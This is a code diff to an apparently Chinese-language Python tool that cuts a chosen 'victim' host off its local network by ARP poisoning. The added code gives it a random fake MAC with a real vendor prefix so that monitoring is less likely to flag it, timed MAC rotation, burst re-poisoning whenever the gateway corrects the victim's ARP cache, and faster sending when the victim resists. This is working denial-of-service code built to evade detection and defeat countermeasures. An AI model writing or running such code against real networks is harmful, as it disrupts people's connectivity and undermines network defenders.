@@ -43,8 +43,8 @@ def _arp_reply(dst_mac, psrc, hwsrc, pdst, hwdst):
 class Isolator:
     def __init__(self, victim_ip, victim_mac, gateway_ip, gateway_mac,
                  mode="offnet", peers=None, interval=1.0,
-                 fake_mac=DEFAULT_FAKE_MAC, iface=None, dry_run=False,
-                 no_restore=False):
+                 fake_mac=None, iface=None, dry_run=False,
+                 no_restore=False, mac_rotate=0):
         mode = normalize_mode(mode)
         if mode not in MODES:
             raise IsolationError(f"未知隔离模式: {mode}（可选 {MODES}）")
@@ -57,21 +57,31 @@ class Isolator:
         self.gateway_mac = (gateway_mac or "").lower()
         self.peers = dict(peers or {})
         self.interval = max(0.2, float(interval))
-        self.fake_mac = fake_mac.lower()
         self.iface = iface
         self.dry_run = dry_run
         self.no_restore = no_restore
+        self.mac_rotate = max(0, int(mac_rotate))  # 0=不轮换，>0=每N秒换
+        self.session_file = None
+        self.started_ts = None
+        self._sniffer = None
+        self._last_mac_change = 0
+
+        # 假 MAC：未指定则随机生成（真实厂商 OUI，不易被监控识别）
+        from .netutils import random_fake_mac
+        self.fake_mac = (fake_mac or random_fake_mac()).lower()
+
         self.stats = {
             "sent": 0, "rounds": 0,
             "arp_requests": 0,       # 目标对网关的 who-has 广播次数
             "outbound_pkts": 0,      # 目标发往非本网段的数据包数（>0 = 还能上网）
             "outbound_bytes": 0,     # 出站总字节
+            "gw_corrections": 0,     # 网关试图纠正 ARP 的次数（反竞争触发器）
+            "mac_changes": 0,        # MAC 轮换次数
             "last_arp_req": 0,       # 最近一次 ARP 广播时间戳
             "last_outbound": 0,      # 最近一次出站数据时间戳
+            "last_gw_correction": 0, # 最近一次网关纠正时间戳
+            "adaptive_boost": 0,     # 自适应加速剩余秒数
         }
-        self.session_file = None
-        self.started_ts = None
-        self._sniffer = None
 
     def _start_verifier(self):
         """三维验证嗅探器：ARP 广播 + 出站流量 + 综合判定。
@@ -107,6 +117,13 @@ class Isolator:
                             and arp.pdst == gw_ip):
                         self.stats["arp_requests"] += 1
                         self.stats["last_arp_req"] = time.time()
+
+                    # 维度 1b：网关纠正（网关告诉目标正确 MAC = 竞争对手）
+                    if (arp.op == 2 and str(arp.hwsrc).lower() != self.fake_mac
+                            and arp.psrc == gw_ip
+                            and str(arp.hwdst).lower() == victim_mac):
+                        self.stats["gw_corrections"] += 1
+                        self.stats["last_gw_correction"] = time.time()
 
                 # 维度 2：出站流量（目标还在发数据到外部 = 未断网）
                 if IP in pkt:
@@ -204,42 +221,83 @@ class Isolator:
 
         poison = self.build_poison()
         if self.dry_run:
+            log(f"[dry-run] 假 MAC: {self.fake_mac}（随机生成）")
             log(f"[dry-run] 以下 {len(poison)} 个数据包将每 {self.interval}s 发送一轮：")
             for p in poison:
                 log("    " + p.summary())
+            if self.mac_rotate:
+                log(f"[dry-run] MAC 每 {self.mac_rotate}s 自动轮换")
             log("[dry-run] 未发送任何数据包")
             return
 
         self.started_ts = time.time()
         self._save_session(active=True)
         audit_event("isolate_start", victim=self.victim_ip, mac=self.victim_mac,
-                    mode=self.mode, gateway=self.gateway_ip, peers=len(self.peers))
+                    mode=self.mode, gateway=self.gateway_ip, peers=len(self.peers),
+                    fake_mac=self.fake_mac)
         start = time.time()
         last_report = start
+        self._last_mac_change = start
         self._start_verifier()
         try:
             for _ in range(3):  # 首轮连发，快速覆盖目标缓存
                 sendp(poison, iface=self.iface, verbose=0)
                 self.stats["sent"] += len(poison)
-            log("[+] 隔离已启动。保持本进程运行；Ctrl+C / 恢复按钮将停止并自动恢复")
+            log(f"[+] 隔离已启动（假 MAC: {self.fake_mac}）。保持本进程运行")
             while True:
                 if stop_event is not None and stop_event.is_set():
                     log("[*] 收到停止指令，开始恢复 ...")
                     break
-                if duration and time.time() - start >= duration:
+                now = time.time()
+
+                # MAC 自动轮换
+                if self.mac_rotate and now - self._last_mac_change >= self.mac_rotate:
+                    from .netutils import random_fake_mac
+                    self.fake_mac = random_fake_mac()
+                    self._last_mac_change = now
+                    self.stats["mac_changes"] += 1
+                    poison = self.build_poison()  # 重建毒包
+                    sendp(poison, iface=self.iface, verbose=0)  # 立即用新 MAC 发一轮
+                    self.stats["sent"] += len(poison)
+                    log(f"    ↻ MAC 已轮换 → {self.fake_mac}")
+
+                # 反免费 ARP 竞争：网关刚发了纠正包时立即补毒
+                if now - self.stats.get("last_gw_correction", 0) < 2:
+                    for _ in range(3):  # 爆发 3 轮压制
+                        sendp(poison, iface=self.iface, verbose=0)
+                        self.stats["sent"] += len(poison)
+
+                # 自适应频率：目标激烈反抗（ARP 广播密集）时临时加速
+                recent_arp = now - self.stats.get("last_arp_req", 0) < 5
+                if recent_arp and self.stats.get("adaptive_boost", 0) <= 0:
+                    self.stats["adaptive_boost"] = 10  # 加速 10 秒
+                if self.stats.get("adaptive_boost", 0) > 0:
+                    self.stats["adaptive_boost"] -= 1
+                    effective_interval = max(0.3, self.interval * 0.5)  # 半间隔
+                else:
+                    effective_interval = self.interval
+
+                if duration and now - start >= duration:
                     log(f"[*] 达到设定时长 {duration}s，自动停止并恢复")
                     break
+
                 sendp(poison, iface=self.iface, verbose=0)
                 self.stats["sent"] += len(poison)
                 self.stats["rounds"] += 1
-                now = time.time()
                 if now - last_report >= 10:
-                    extra = (f" | 目标ARP广播 {self.stats['arp_requests']} 次"
-                             f"{'（生效确认）' if self.verified else ''}"
-                             if self._sniffer is not None else "")
-                    log(f"    已隔离 {int(now - start)}s | 累计发包 {self.stats['sent']}{extra}")
+                    extra = (f" | ARP广播 {self.stats['arp_requests']}"
+                             f" | 出站 {self.stats['outbound_pkts']}"
+                             + (f" | MAC轮换 {self.stats['mac_changes']}次" if self.stats['mac_changes'] else "")
+                             for _ in [0]).__next__()
+                    log(f"    已隔离 {int(now - start)}s | 发包 {self.stats['sent']}{extra}")
+                    # 静态 ARP 检测
+                    elapsed = now - start
+                    if (elapsed > 30 and self.stats["sent"] > 100
+                            and self.stats["outbound_pkts"] > 10
+                            and self.stats["arp_requests"] < 2):
+                        log("    [!] ⚠ 目标可能配置了静态 ARP 条目（arp -s），污染无法覆盖")
                     last_report = now
-                time.sleep(self.interval)
+                time.sleep(effective_interval)
         except KeyboardInterrupt:
             log("\n[!] 收到中断信号，开始恢复 ...")
         finally:
@@ -496,6 +554,9 @@ class IsolationManager:
                 "sent": iso.stats["sent"],
                 "arp_requests": iso.stats.get("arp_requests", 0),
                 "outbound_pkts": iso.stats.get("outbound_pkts", 0),
+                "gw_corrections": iso.stats.get("gw_corrections", 0),
+                "mac_changes": iso.stats.get("mac_changes", 0),
+                "current_fake_mac": iso.fake_mac,
                 "status": iso.isolation_status,
                 "seconds_since_arp": int(now - iso.stats.get("last_arp_req", 0)) if iso.stats.get("last_arp_req") else -1,
                 "seconds_since_outbound": int(now - iso.stats.get("last_outbound", 0)) if iso.stats.get("last_outbound") else -1,
